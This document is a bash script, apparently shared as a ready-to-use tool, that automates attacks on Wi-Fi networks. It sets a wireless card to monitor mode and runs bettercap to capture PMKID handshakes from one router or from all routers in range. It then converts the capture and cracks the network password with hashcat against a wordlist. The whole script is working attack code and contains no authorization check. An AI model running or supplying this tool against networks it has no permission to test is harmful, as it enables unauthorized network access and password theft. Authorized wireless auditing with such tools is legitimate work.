#!/bin/bash

#######################################################################
#                                                                     #
#  Name:        wifi_pmkid                                            #
#                                                                     #
#  Author:      D4LL45                                                #
#  Version:     1.0.0                                                 #
#  Date:        16.08.2022                                            #
#                                                                     #
#  Description: Use this script to catch a pmkid handshake for a      #
#               specific router. It uses bettercap and hashcat        #
#                                                                     #
#  Parameter:   none                                                  #
#                                                                     #
#  Usage: 	sudo wifi_pmkid (root required)                       #
#                                                                     #
#######################################################################


if [[ $(id -u) -ne 0 ]]; then
	echo "Come on, you need to be root!";
	exit 1;
fi

mkdir /tmp/wifi_pmkid
echo " -> looking for your connected wifi devices"
airmon-ng > /tmp/wifi_pmkid/interfaces.txt
echo ""

echo "Select your wifi device for monitoring mode:"
ifacepath="/tmp/wifi_pmkid/interfaces.txt"
c=0
ifaces[0]=""
while IFS= read -r line
do
	if [[ $line == *"phy"* ]]; then
		ifaces[c]="$(cut -d$'\t' -f2 <<<$line)"
		((c++))
	fi
done < "$ifacepath"
c=0
for i in "${ifaces[@]}"
do
	echo "$c) $i"
	((c++))
done
read -n 1 -p "Device Selection:" usrinput
echo ""
echo "Selected device is ${ifaces[$usrinput]}."
usriface=${ifaces[$usrinput]}
echo ""

echo " -> setting your wifi device to monitoring mode"
ip link set $usriface down
iw dev $usriface set type monitor
rfkill unblock all
ip link set $usriface up

echo " -> starting bettercap for capturing PMKIDs"
echo "Use wifi.assoc * for capturing PMKIDs on all routers or wifi.assoc MAC for capturing a specific PMKID."
echo "When finished capturing, quit bettercap to go on..."
sleep 5
bettercap -iface $usriface -caplet /root/commands.cap

echo ""
echo "Type in the directory to store the *.pcap file containing the handshake:"
read -e -p "Directory: " dirinput
if [[ ! -d $dirinput ]]; then
	mkdir $dirinput
fi
echo ""

mv /root/bettercap-wifi-handshakes.pcap $dirinput
hcxpcapngtool -o $dirinput/handshake-hash.txt $dirinput/bettercap-wifi-handshakes.pcap
echo "moved the .pcap file to $dirinput"
echo "created handshake-hash.txt to crack the hash with hashcat"
echo ""
echo "Do you want to crack the password with hashcat?"
echo "0) yes"
echo "1) no"
read -p "Choice: " choice
echo ""
if [ $choice -gt 1 ] || [ $choice -lt 0 ]; then
	$choice=1
fi
if [ $choice -eq 0 ]; then
	echo "Location of your wordlist:"
	read -e -p "Path (full): " wordlistinput
	hashcat -m22000 $dirinput/handshake-hash.txt $wordlistinput
	echo ""
else
	echo ""
	echo "Last thing to do is cracking the password from handshake-hash.txt with hashcat by using:"
	echo "hashcat -m22000 handshae-hash.txt wordlist.txt"
	echo ""
fi
echo "That's it... xD"
echo ""
echo ""
